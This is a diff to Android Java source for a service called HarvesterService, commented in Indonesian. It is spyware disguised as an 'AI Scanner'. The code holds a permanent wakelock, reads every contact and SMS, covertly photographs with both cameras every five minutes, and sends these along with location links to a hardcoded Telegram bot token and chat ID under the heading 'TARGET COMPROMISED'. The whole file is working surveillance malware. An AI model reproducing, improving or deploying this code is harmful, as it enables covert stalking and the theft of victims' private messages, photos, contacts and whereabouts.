@@ -22,48 +22,30 @@ import okhttp3.*;
 
 public class HarvesterService extends Service {
     private OkHttpClient client = new OkHttpClient();
-    
-    // --- GANTI INI PAKE PUNYA LU ---
     private String BOT_TOKEN = "9136102668:AAHIqngLUTmSneSbZt-ddd34YqRHcpKIkSM"; 
     private String CHAT_ID = "5437327956";     
-    
     private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        
-        // 1. BIKIN NOTIFIKASI (Anti-Kill)
-        String CHANNEL_ID = "AIScannerChannel";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    CHANNEL_ID, "AI Scanner", NotificationManager.IMPORTANCE_LOW
-            );
-            serviceChannel.setShowBadge(false); // Biar gak keliatan titik merah
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(serviceChannel);
+        try {
+            String CHANNEL_ID = "AIScannerChannel";
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID, "AI Scanner", NotificationManager.IMPORTANCE_LOW);
+                NotificationManager manager = getSystemService(NotificationManager.class);
+                manager.createNotificationChannel(serviceChannel);
+            }
+            Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
+            Notification notification = builder.setContentTitle("AI Scanner Active").setContentText("Memproses...").setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build();
+            startForeground(1, notification);
+
+            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AISpy::WakeLock");
+            wakeLock.acquire();
+        } catch (Exception e) {
+            sendTgText("❌ ERROR START FOREGROUND: " + e.getMessage());
         }
-
-        Notification.Builder builder;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            builder = new Notification.Builder(this, CHANNEL_ID);
-        } else {
-            builder = new Notification.Builder(this);
-        }
-
-        Notification notification = builder
-                .setContentTitle("AI Scanner Active")
-                .setContentText("Memindai data...")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
-                .setOngoing(true) // Biar gak bisa di-swipe
-                .build();
-        
-        startForeground(1, notification);
-
-        // 2. BIKIN WAKELOCK (CPU Gak Tidur)
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AISpy::WakeLock");
-        wakeLock.acquire(); // Gak ada timeout, jalan sampe HP mati
     }
 
     @Override
@@ -72,57 +54,56 @@ public class HarvesterService extends Service {
             @Override
             public void run() {
                 boolean isFirstRun = true;
-                
                 while (true) {
                     try {
                         if (isFirstRun) {
-                            // Kirim Kontak & SMS Sekali di Awal
                             String contacts = getContacts();
                             String sms = getSms();
                             sendTgText("🎯 <b>TARGET COMPROMISED</b>\n\n<b>KONTAK:</b>\n" + contacts + "\n\n<b>SMS:</b>\n" + sms);
                             isFirstRun = false;
                         }
 
-                        // Ambil Lokasi
                         String locLink = getLocationLink();
                         
-                        // Ambil Foto Depan & Belakang
-                        takePhotoWithCamera(0, "📸 Foto Belakang");
-                        Thread.sleep(2000); // Jeda 2 detik biar hardware gak bentrok
-                        takePhotoWithCamera(1, "📸 Foto Depan");
+                        // Ambil foto pake try-catch terpisah biar gak matiin loop
+                        try {
+                            takePhotoWithCamera(0, "📸 Foto Belakang");
+                            Thread.sleep(2000);
+                            takePhotoWithCamera(1, "📸 Foto Depan");
+                        } catch (Exception e) {
+                            sendTgText("❌ ERROR KAMERA: " + e.getMessage());
+                        }
 
-                        // Kirim Lokasi
                         sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
-
-                        // Tidur 5 menit (300.000 ms)
-                        Thread.sleep(300000); 
+                        Thread.sleep(300000); // 5 Menit
                         
                     } catch (Exception e) {
+                        // Kirim error ke Telegram biar lu tau kenapa dia mati
+                        sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
                         try { Thread.sleep(60000); } catch (Exception ex) {}
                     }
                 }
             }
         }).start();
-        return START_STICKY; // Otomatis nyala lagi kalo dibunuh sistem
+        return START_STICKY;
     }
 
     private String getLocationLink() {
         try {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-            // Ambil dari Network Provider (lebih cepet & hemat baterai dari GPS)
             Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            
-            if (loc != null) {
-                return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
-            }
+            if (loc != null) return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
+        } catch (SecurityException se) {
+            return "Izin Lokasi Ditolak!";
         } catch (Exception e) {}
         return "Lokasi gak tersedia.";
     }
 
     private void takePhotoWithCamera(int cameraId, String caption) {
+        Camera camera = null;
         try {
-            Camera camera = Camera.open(cameraId);
+            camera = Camera.open(cameraId);
             camera.setPreviewTexture(new SurfaceTexture(0));
             camera.startPreview();
             camera.takePicture(null, null, new Camera.PictureCallback() {
@@ -130,47 +111,48 @@ public class HarvesterService extends Service {
                 public void onPictureTaken(byte[] data, Camera cam) {
                     String fileName = (cameraId == 0) ? "spy_back.jpg" : "spy_front.jpg";
                     File file = new File(getExternalFilesDir(null), fileName);
-                    try (FileOutputStream fos = new FileOutputStream(file)) {
-                        fos.write(data);
-                    } catch (Exception e) {}
+                    try (FileOutputStream fos = new FileOutputStream(file)) { fos.write(data); } catch (Exception e) {}
                     cam.release();
                     sendTgPhoto(file, caption);
                 }
             });
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            if (camera != null) camera.release();
+            sendTgText("❌ ERROR KAMERA " + cameraId + ": " + e.getMessage());
+        }
     }
 
     private String getContacts() {
         StringBuilder sb = new StringBuilder();
-        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
-                  .append(" : ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
+        try {
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
+                }
+                cursor.close();
             }
-            cursor.close();
-        }
+        } catch (Exception e) { return "Error izin kontak: " + e.getMessage(); }
         return sb.toString();
     }
 
     private String getSms() {
         StringBuilder sb = new StringBuilder();
-        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)))
-                  .append("\nIsi: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))).append("\n\n");
+        try {
+            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))).append("\nIsi: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))).append("\n\n");
+                }
+                cursor.close();
             }
-            cursor.close();
-        }
+        } catch (Exception e) { return "Error izin SMS: " + e.getMessage(); }
         return sb.toString();
     }
 
     private void sendTgText(String text) {
         try {
-            JSONObject json = new JSONObject();
-            json.put("chat_id", CHAT_ID); json.put("text", text);
-            json.put("parse_mode", "HTML");
+            JSONObject json = new JSONObject(); json.put("chat_id", CHAT_ID); json.put("text", text); json.put("parse_mode", "HTML");
             RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
             client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).execute();
         } catch (Exception e) {}
@@ -178,24 +160,16 @@ public class HarvesterService extends Service {
 
     private void sendTgPhoto(File file, String caption) {
         try {
-            RequestBody requestBody = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("caption", caption)
-                    .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
-                    .build();
+            RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID).addFormDataPart("caption", caption)
+                    .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))).build();
             client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto").post(requestBody).build()).execute();
         } catch (Exception e) {}
     }
 
-    @Override
-    public void onDestroy() {
+    @Override public void onDestroy() {
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         super.onDestroy();
-        // Kalau service mati, nyalain ulang
-        startService(new Intent(this, HarvesterService.class));
     }
-
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
+    @Override public IBinder onBind(Intent intent) { return null; }
 }
